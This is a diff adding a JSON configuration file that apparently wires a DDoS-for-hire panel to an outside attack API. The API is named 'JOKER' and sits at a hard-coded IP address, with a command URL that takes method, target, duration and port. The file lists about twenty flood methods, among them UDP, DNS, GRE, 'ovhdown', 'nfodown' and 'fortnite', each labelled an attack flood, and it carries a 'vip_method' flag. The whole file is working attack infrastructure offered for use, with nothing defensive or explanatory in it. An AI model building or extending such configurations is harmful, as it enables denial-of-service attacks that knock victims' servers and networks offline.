@@ -1,0 +1,98 @@
+{
+    "methods": [
+        {
+            "api_name": "JOKER",
+            "target": "http://185.196.10.155:8080/api?cmd=.[method]%20[target]%20[duration]%20dport=[port]",
+            "urlEncode": true,
+            "attack_methods": ["udp", "udpplain", "std", "ice", "udphex", "stdhex", "vse", "dns", "home", "ack", "greip", "greeth", "killall", "ovhdown", "nfodown", "randhex", "kpac", "game", "MW", "mw", "fortnite"],
+            "custom_define": [
+                {
+                    "method": "udp",
+                    "description": "Simple UDP attack flood sent through API"
+                },
+                {
+                    "method": "udpplain",
+                    "description": "Simple UDP Plain attack flood sent through API"
+                },
+                {
+                    "method": "std",
+                    "description": "Simple STD attack flood sent through API"
+                },
+                {
+                    "method": "ice",
+                    "description": "Simple ICE attack flood sent through API"
+                },
+                {
+                    "method": "udphex",
+                    "description": "Simple UDP Hex attack flood sent through API"
+                },
+                {
+                    "method": "stdhex",
+                    "description": "Simple STD Hex attack flood sent through API"
+                },
+                {
+                    "method": "vse",
+                    "description": "Simple VSE attack flood sent through API"
+                },
+                {
+                    "method": "dns",
+                    "description": "Simple DNS attack flood sent through API"
+                },
+                {
+                    "method": "home",
+                    "description": "Simple Home attack flood sent through API"
+                },
+                {
+                    "method": "ack",
+                    "description": "Simple ACK attack flood sent through API"
+                },
+                {
+                    "method": "greip",
+                    "description": "Simple GREIP attack flood sent through API"
+                },
+                {
+                    "method": "greeth",
+                    "description": "Simple GREETH attack flood sent through API"
+                },
+                {
+                    "method": "killall",
+                    "description": "Simple Killall attack flood sent through API"
+                },
+                {
+                    "method": "ovhdown",
+                    "description": "Simple OVH Down attack flood sent through API"
+                },
+                {
+                    "method": "nfodown",
+                    "description": "Simple NFO Down attack flood sent through API"
+                },
+                {
+                    "method": "randhex",
+                    "description": "Simple Randhex attack flood sent through API"
+                },
+                {
+                    "method": "kpac",
+                    "description": "Simple Kpac attack flood sent through API"
+                },
+                {
+                    "method": "game",
+                    "description": "Simple Game attack flood sent through API"
+                },
+                {
+                    "method": "MW",
+                    "description": "Simple MW attack flood sent through API"
+                },
+                {
+                    "method": "mw",
+                    "description": "Simple mw attack flood sent through API"
+                },
+                {
+                    "method": "fortnite",
+                    "description": "Simple Fortnite attack flood sent through API"
+                }
+            ],
+            "default_port": 80,
+            "vip_method": true
+        }
+    ]
+}
